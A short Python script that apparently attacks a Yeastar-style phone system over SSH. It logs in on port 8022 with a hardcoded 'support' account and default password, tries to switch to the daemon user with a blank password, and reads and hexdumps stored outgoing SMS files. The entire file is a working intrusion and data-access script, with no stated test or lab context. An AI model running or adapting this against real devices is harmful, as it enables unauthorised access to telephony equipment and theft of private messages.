import paramiko
import time

host = "192.168.1.55"
port = 8022
username = "support"
password = "iyeastar"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(
    hostname=host,
    port=port,
    username=username,
    password=password,
    disabled_algorithms={
        'pubkeys': ['rsa-sha2-256', 'rsa-sha2-512']
    }
)

print("Attempting to read SMS files via interactive shell")
print("="*60)

# Create an interactive shell
channel = client.invoke_shell()
time.sleep(2)

# Clear any initial output
channel.recv(65535)

# Try to switch to daemon user (might not require password)
channel.send("su daemon\n")
time.sleep(2)

# Check if it asked for password
output = channel.recv(65535).decode()
print(f"Response after 'su daemon':\n{output}")

# If it asks for password, send empty (daemon might have no password)
if "Password" in output or "password" in output:
    channel.send("\n")
    time.sleep(2)
    output = channel.recv(65535).decode()
    print(f"After sending blank password:\n{output}")

# Try to read the file
channel.send("cat /ysdisk/sms/sendsms/17777334771180428938312574\n")
time.sleep(2)
output = channel.recv(65535).decode()
print(f"\nFile content (278 bytes file):\n{output}")

# Try the small file
channel.send("cat /ysdisk/sms/sendsms/17787489071180428938327852\n")
time.sleep(2)
output = channel.recv(65535).decode()
print(f"\nFile content (8 bytes file):\n{output}")

# Try to see what user we are now
channel.send("whoami\n")
time.sleep(2)
output = channel.recv(65535).decode()
print(f"\nCurrent user:\n{output}")

# Try to read with hexdump if cat doesn't show binary
channel.send("hexdump -C /ysdisk/sms/sendsms/17777334771180428938312574\n")
time.sleep(2)
output = channel.recv(65535).decode()
print(f"\nHexdump of file:\n{output}")

channel.close()
client.close()